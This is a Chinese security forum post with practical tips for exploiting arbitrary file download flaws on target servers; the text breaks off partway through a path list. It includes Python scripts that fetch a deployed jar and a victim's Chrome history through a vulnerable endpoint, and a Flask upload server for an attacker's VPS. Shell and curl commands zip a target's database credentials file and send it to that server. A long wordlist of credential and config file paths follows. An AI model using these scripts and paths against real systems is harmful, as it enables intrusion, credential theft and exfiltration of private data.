---
title: 关于任意文件下载的经验
url: https://forum.90sec.com/t/topic/2514
source: 90Sec - 最新话题
date: 2025-07-06
fetch_date: 2025-10-06T23:25:53.178962
---

# 关于任意文件下载的经验

[90Sec](/)

# [关于任意文件下载的经验](/t/topic/2514)

[技术文章](/c/article/6)

[82303224](https://forum.90sec.com/u/82303224)

2025 年7 月 5 日 08:03

1

背景：目标存在任意文件上传和任意文件下载，但是找不到物理路径。
是iis 可以读iis配置
是php可以尝试读apache配置

不是iis，不是php的时候 tomcat的时候，
除开常见的路径之外，还可以考虑读 谷歌浏览器记录，向日葵，todesk等等
windows下的这个路径可以读一下：
C:/Users/Administrator/AppData/Local/IconCache.db

[![dddd](https://forum.90sec.com/uploads/default/optimized/2X/b/b3cbb3ff1d9ef15ef8c133f214c952369b16e0e6_2_690x310.jpeg)

dddd1920×865 186 KB](https://forum.90sec.com/uploads/default/original/2X/b/b3cbb3ff1d9ef15ef8c133f214c952369b16e0e6.jpeg "dddd")

linux下的 这个路径可以读一下
/var/lib/mlocate/mlocate.db

当存在任意文件读取漏洞的时候，遇到大文件的时候，可以使用脚本或yakit下载下来
脚本：

```
Extension商店下载插件 copy as python

生成脚本

import requests
#https的站需要导入
import urllib3
urllib3.disable_warnings()

burp0_url = "https://x:443/api/file/download"
burp0_headers = {"Connection": "close", "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"", "accept": "*/*", "Content-Type": "application/json", "sec-ch-ua-mobile": "?0", "Authorization": "bearer", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "sec-ch-ua-platform": "\"Windows\"", "Origin": "https://xxxx", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://xxxx/swagger-ui.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8"}
burp0_json="/data/deploy/java/zzz.jar"
#https的站需要加参数：verify=False,timeout=300（超时时间按需要设置）
text = requests.post(burp0_url, headers=burp0_headers, json=burp0_json,verify=False,timeout=300).content

#写入文件，w表示写，b表示二进制写入，其他文本可以不用加b
#创建一个test.jar文件
f = open("test.jar",'wb')
f.write(text)
f.close()

--------------------------------------------------------------------------------------------------------
import urllib3
import requests
urllib3.disable_warnings()

burp0_url = "http://114.114.114.114:8085/down/images/download.action"
burp0_headers = {
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "*/*",
    "Accept-Language": "en-US;q=0.9,en;q=0.8",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded"
}
burp0_data = {"fileurl": "C:\\Users\\administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"}

# 发送 POST 请求并获取响应
response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

# 检查请求是否成功（HTTP 状态码 200 表示成功）
if response.status_code == 200:
    # 获取响应内容（文本或二进制数据）
    #text = response.text  # 如果是文本数据
    content = response.content  # 如果是二进制数据（如文件）

    # 写入文件（如果是文本数据）
    with open("History.db", "wb") as f:
        f.write(content)
    print("文件写入成功！")
else:
    print(f"请求失败，状态码：{response.status_code}")
```

有时候遇到命令执行，且只能命令执行的时候，读文件内容技巧：

upload接口上传脚本：起一个python，同目录建立一个file目录

```
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    file.save(os.path.join('files', file.filename))
    return 'File uploaded successfully'

if __name__ == '__main__':
    # 文件默认保存在files目录下
    if not os.path.exists('files'):
        os.makedirs('files')
    app.run(host="0.0.0.0",port=8080)
```

如java包，先解压，在压缩你要看的文件
mkdir /tmp/java1/
unzip yourfile.jar -d /tmp/java1/
zip -r /tmp/java1/1.zip /tmp/java1/weapps/web-inf/classes/jdbc.properties
上传到你的vps file路径下1.zip
curl -X POST <http://127.0.0.1:8080/upload> -F file=@/tmp/java/1.zip

Windows字典：

```
c:/apache tomcat/webapps/web-inf/classes/db.properties
c:/apache tomcat/webapps/web-inf/classes/jdbc.properties
c:/apache tomcat/webapps/web-inf/web.xml
c:/apache tomcat-8.0.53/webapps/web-inf/classes/db.properties
c:/apache tomcat-8.0.53/webapps/web-inf/classes/jdbc.properties
c:/apache tomcat-8.0.53/webapps/web-inf/web.xml
c:/apache/apache~1.3 -windows-x64/apache~1.3/webapps/web-inf/classes/db.properties
c:/apache/apache~1.3 -windows-x64/apache~1.3/webapps/web-inf/classes/jdbc.properties
c:/apache/apache~1.3 -windows-x64/apache~1.3/webapps/web-inf/web.xml
c:/apache/apache~1.3-windows-x64/apache~1.3/webapps/web-inf/classes/db.properties
c:/apache/apache~1.3-windows-x64/apache~1.3/webapps/web-inf/classes/jdbc.properties
c:/apache/apache~1.3-windows-x64/apache~1.3/webapps/web-inf/web.xml
c:/apache/apache2/conf/httpd.conf
c:/apache/apache-tomcat-8.0.53 -windows-x64/apache-tomcat-8.0.53/webapps/web-inf/classes/db.properties
c:/apache/apache-tomcat-8.0.53 -windows-x64/apache-tomcat-8.0.53/webapps/web-inf/classes/jdbc.properties
c:/apache/apache-tomcat-8.0.53 -windows-x64/apache-tomcat-8.0.53/webapps/web-inf/web.xml
c:/apache/apache-tomcat-8.0.53-windows-x64/apache-tomcat-8.0.53/webapps/web-inf/classes/db.properties
c:/apache/apache-tomcat-8.0.53-windows-x64/apache-tomcat-8.0.53/webapps/web-inf/classes/jdbc.properties
c:/apache/apache-tomcat-8.0.53-windows-x64/apache-tomcat-8.0.53/webapps/web-inf/web.xml
c:/apache/conf/httpd.conf
c:/apache/mysql/data/mysql/user.myd
c:/apache/mysql/mysql/data/mysql/user.myd
c:/apache/mysql/mysql~1.5/data/mysql/user.myd
c:/apache/mysql/mysql~1.7/data/mysql/user.myd
c:/apache/mysql/mysql~1.8/data/mysql/user.myd
c:/apache/mysql/mysql~1/data/mysql/user.myd
c:/apache/mysql~1.5/data/mysql/user.myd
c:/apache/mysql~1.7/data/mysql/user.myd
c:/apache/mysql~1.8/data/mysql/user.myd
c:/apache/mysql~1/data/mysql/user.myd
c:/apache~1.3 -windows-x86/apache~1.3/webapps/web-inf/classes/db.properties
c:/apache~1.3 -windows-x86/apache~1.3/webapps/web-inf/classes/jdbc.properties
c:/apache~1.3 -windows-x86/apache~1.3/webapps/web-inf/web.xml
c:/apache~1.3/webapps/web-inf/classes/db.properties
c:/apache~1.3/webapps/web-inf/classes/jdbc.properties
c:/apache~1.3/webapps/web-inf/web.xml
c:/apache~1/webapps/web-inf/classes/db.properties
c:/apache~1/webapps/web-inf/classes/jdbc.properties
c:/apache~1/webapps/web-inf/web.xml
c:/apache-tomcat-8.0.53 -windows-x86/apache-tomcat-8.0.53/webapps/web-inf/classes/db.properties
c:/apache-tomcat-8.0.53 -windows-x86/apache-tomcat-8.0.53/webapps/web-inf/classes/jdbc.properties
c:/apache-tomcat-8.0.53 -windows-x86/apache-tomcat-8.0.53/webapps/web-inf/web.xml
c:/apache-tomcat-8.0.53/webapps/web-inf/classes/db.properties
c:/apache-tomcat-8.0.53/webapps/web-inf/classes/jdbc.properties
c:/apache-tomcat-8.0.53/webapps/web-inf/web.xml
c:/boot.ini
c:/computerlearning/tomcat8.0.53/binwebapps/web-inf/classes/db.properties
c:/computerlearning/tomcat8.0.53/binwebapps/web-inf/classes/jdbc.properties
c:/computerlearning/tomcat8.0.53/binwebapps/web-inf/web.xml
c:/inetpub/wwwroot/web.config
c:/mysql server 5.7/data/mysql/user.myd
c:/mysql/data/mysql/user.myd
c:/mysql/mysql/data/mysql/user.myd
c:/mysql/mysql~1.5/data/mysql/user.myd
c:/mysql/mysql~1.7/data/mysql/user.myd
c:/mysql/mysql~1.8/data/mysql/user.myd
c:/mysql/mysql~1/data/mysql/user.myd
c:/mysql~1.5/data/mysql/user.myd
c:/mysql~1.7/data/mysql/user.myd
c:/mysql~1.8/data/mysql/user.myd
c:/mysql~1/data/mysql/user.myd
c:/progra~1/ serv-u/servuadmin.exe
c:/progra~1/[jboss]/server/default/conf/jboss-minimal.xml
c:/progra~1/[jboss]/server/default/conf/jboss-service.xml
c:/progra~1/[jboss]/server/default/conf/jndi.properties
c:/progra~1/[jboss]/server/default/conf/log4j.xml
c:/progra~1/[jboss]/server/default/conf/login-config.xml
c:/progra~1/[jboss]/server/default/conf/server.log.properties
c:/progra~1/[jboss]/server/default/conf/standardjaws.xml
c:/progra~1/[jboss]/server/default/conf/standardjboss.xml
c:/progra~1/[jboss]/server/default/deploy/jboss-logging.xml
c:/progra~1/[jboss]/server/default/log/boot.log
c:/progra~1/[jboss]/server/default/log/server.log
c:/progra~1/apache group/apache/apache.conf
c:/progra~1/apache group/apache/apache2.conf
c:/progra~1/apache group/apache/conf/apache.conf
c:/progra~1/apache group/apache/conf/apache2.conf
c:/progra~1/apache group/apache/conf/httpd.conf
c:/progra~1/apache gro...